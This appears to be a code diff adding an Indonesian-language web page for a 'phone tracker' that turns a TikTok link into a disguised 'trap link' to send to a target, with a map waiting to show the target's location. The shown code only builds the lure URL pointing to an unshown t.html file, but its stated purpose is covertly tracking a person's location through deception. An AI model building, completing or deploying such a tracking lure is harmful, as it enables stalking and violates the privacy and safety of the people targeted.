@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLAZER 😈 | Phone Tracker Telegram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        #map { height: 500px; width: 100%; border-radius: 15px; }
+        .blazer-bg { background: #0f0f0f; color: #ff0000; }
+        .input-dark { background: #000; border: 1px solid #ff0000; color: #fff; }
+    </style>
+</head>
+<body class="blazer-bg p-5">
+    <div class="max-w-4xl mx-auto">
+        <h1 class="text-3xl font-bold mb-5 text-center">SYSTEM TRACKER BLAZER 😈</h1>
+        
+        <div class="bg-zinc-900 p-6 rounded-xl mb-5 border border-red-600">
+            <div class="flex flex-col gap-3">
+                <input type="text" id="tiktokLink" placeholder="Masukkan Link TikTok Umpan..." 
+                class="p-3 input-dark rounded focus:outline-none focus:ring-1 focus:ring-red-500">
+                
+                <button onclick="createTrap()" class="bg-red-700 hover:bg-red-600 text-white p-3 rounded font-bold uppercase tracking-widest transition-all">
+                    Generate Link Pelacak 😈
+                </button>
+            </div>
+            
+            <div id="resultBox" class="hidden mt-4 p-4 bg-black border-l-4 border-yellow-500 rounded">
+                <p class="text-[10px] text-zinc-500 font-bold uppercase">Kirim Link Ini Ke Target:</p>
+                <p id="finalLink" class="text-yellow-500 text-sm break-all font-mono mt-1"></p>
+            </div>
+
+            <p id="status" class="mt-4 text-sm text-gray-400 italic text-center border-t border-zinc-800 pt-2">
+                Status: Menunggu Target Terdeteksi di Telegram...
+            </p>
+        </div>
+
+        <div id="map" class="border-2 border-red-900 shadow-2xl shadow-red-500/20"></div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        // Inisialisasi Map (Tampilan Awal)
+        const map = L.map('map').setView([-2.5489, 118.0149], 5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+        function createTrap() {
+            const tiktok = document.getElementById('tiktokLink').value;
+            const status = document.getElementById('status');
+            const resBox = document.getElementById('resultBox');
+            const finalLink = document.getElementById('finalLink');
+
+            if (!tiktok) {
+                alert("Masukkan link TikTok dulu untuk umpan!");
+                return;
+            }
+
+            // Membuat link jebakan mengarah ke file t.html
+            const baseUrl = window.location.href.split('index.html')[0];
+            const trapUrl = `${baseUrl}t.html?to=${btoa(tiktok)}`;
+
+            status.innerText = "Link Pelacak Berhasil Dibuat!";
+            resBox.classList.remove('hidden');
+            finalLink.innerText = trapUrl;
+        }
+    </script>
+</body>
+</html>
